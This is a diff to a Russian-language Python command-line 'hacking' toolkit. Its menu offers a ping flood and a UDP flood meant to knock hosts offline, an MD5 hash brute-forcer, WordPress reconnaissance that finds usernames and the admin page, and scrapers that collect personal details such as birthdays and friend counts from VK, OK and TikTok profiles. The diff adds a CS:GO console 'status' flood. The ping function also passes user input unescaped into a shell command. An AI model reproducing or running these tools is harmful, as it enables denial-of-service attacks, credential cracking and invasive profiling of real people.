@@ -17,6 +17,7 @@ import builtwith
 import json
 from itertools import product
 import hashlib
+from telnetlib import Telnet
 
 init(autoreset=True)
 
@@ -44,23 +45,21 @@ def art():
 	███████╗██║  ██║██████╔╝╚██████╔╝██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║██║███████╗███████║
 	╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝''')
 
-
-def checker():
-    url = input('URL: ')
+#checker section
+def checker(url):
     getbrowser = 'https://check-host.net/check-http?host=' + url
     webbrowser.open(getbrowser, new=2)
     print('Готово!')
 
-
-def ping():
-    host = input('Хост: ')
+#ping section
+def ping(host):
     packets = input('Размер пакетов: ')
     threads = int(input('Количество окон: '))
     for i in range(threads):
         os.system('start ping ' + host + ' -l ' + packets + ' -t')
 
-def tiktokparsing():
-    username = input('TikTok username (without @): ')
+#tiktok parsing section
+def tiktokparsing(username):
     link = 'https://socialblade.com/tiktok/user/' + username
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
@@ -88,8 +87,8 @@ def tiktokparsing():
                 file.write('Username: ' + username + '\n' + '\n'.join(counts))
                 file.close()
 
-def vkparsing():
-    url = input('VK (url): ')
+#vk parsing section
+def vkparsing(url):
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
         'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3'
@@ -112,8 +111,8 @@ def vkparsing():
             file.write('URL: ' + url + '\n' + '\n'.join(counts))
             file.close()
 
-def okparsing():
-    url = input('OK (url): ')
+#ok parsing section
+def okparsing(url):
     response = requests.get(url)
     soup = BeautifulSoup(response.text, 'html.parser')
     name = soup.find('a', class_='profile-user-info_name')
@@ -136,6 +135,7 @@ def okparsing():
             file.write('URL: ' + url + '\nПользователь: ' + name.text + '\nДата рождения: ' + birthday.text + '\nКоличество друзей: ' + friends.text + '\nКоличество групп: ' + groups.text + '\nКоличество фотографий: ' + photo.text + '\nКоличество игр: ' + games.text)
             file.close()
 
+#udp flood section
 def launchudp(ip, port, thread, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     for _ in range(int(thread)):
@@ -158,6 +158,7 @@ def attackudp(ip, port, until_datetime):
         except:
             print(Fore.RED + '[@] Ошибка!')
 
+#wordpress section
 def UrlTools(Url):
     if Url.lower().startswith('https://') or Url.lower().startswith('http://'):
         Url = Url.replace('http://','').replace('https://','')
@@ -225,13 +226,13 @@ def wordpressgetinfo(Target):
     Infowebsite = Fore.YELLOW + '[+] '+'Информация: \n' + infoaboutwebsite('http://' + Url)
     print(Fore.RED + 'Домен: ' + Url + '\nIP: ' + Ip + '\n' + Infowebsite + '\n' + Username + '\n' + AdminpageUrl)
 
+#Brute MD5 Section
 def computeMD5hash(string):
   m = hashlib.md5()
   m.update(string.encode('utf-8'))
   return m.hexdigest()
 
-def BruteMD5():
-    md5hash = input('MD5 Hash: ')
+def BruteMD5(md5hash):
     maxlen = int(input('Максимальная длина брута: '))
 
     chr = '''1): ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklnmopqrstuvwxyz1234567890
@@ -302,6 +303,22 @@ def BruteMD5():
     if found == 0:
         print(Fore.RED + 'MD5 не сбручен :(')
 
+#csgo flood section
+def csgoflood(port):
+    timer = 0.035 #Таймер настроен под официльные сервера
+    try:
+        with Telnet('localhost', port) as tn:
+            print('Соединение установлено!')
+            start = input('Запустить скрипт? (Y или N): ')
+            if start == 'Y' or start == 'y':
+                while True:
+                    tn.write(b"status\n")
+                    time.sleep(timer)
+            else:
+                sys.exit(0)
+    except:
+        print('Хост не найден!')
+
 art()
 
 while True:
@@ -320,21 +337,22 @@ while True:
 		$ udpflood - атака на IP до отказа (UDP)
 		$ wordpress - информация о CMS Wordpress
 		$ brutemd5 - брутфорс md5 хэша
+		$ csgoflood - CSGO Status Flood (Параметры запуска CSGO: -netconport [тут порт])
 		$ clear - очистка консоли
 		''')
         pass
     if start == 'checkhost':
         os.system('cls')
-        checker()
+        url = input('URL: ')
+        checker(url)
     if start == 'ping':
         os.system('cls')
-        ping()
+        host = input('Хост: ')
+        ping(host)
     if start == 'okparser':
         os.system('cls')
-        okparsing()
-    if start == 'clear':
-        os.system('cls')
-        pass
+        url = input('OK (url): ')
+        okparsing(url)
     if start == 'udpflood':
         os.system('cls')
         ip = str(input('IP: '))
@@ -344,14 +362,23 @@ while True:
         launchudp(ip, port, thread, t)
     if start == 'tiktokparser':
         os.system('cls')
-        tiktokparsing()
+        username = input('TikTok username (without @): ')
+        tiktokparsing(username)
     if start == 'vkparser':
         os.system('cls')
-        vkparsing()
+        url = input('VK (url): ')
+        vkparsing(url)
     if start == 'wordpress':
         os.system('cls')
         Target = str(input('URL: '))
         wordpressgetinfo(Target)
     if start == 'brutemd5':
         os.system('cls')
-        BruteMD5()
+        md5hash = input('MD5 Hash: ')
+        BruteMD5(md5hash)
+    if start == 'csgoflood':
+        os.system('cls')
+        port = input('Порт для подключения: ')
+        csgoflood(port)
+    if start == 'clear':
+        os.system('cls')
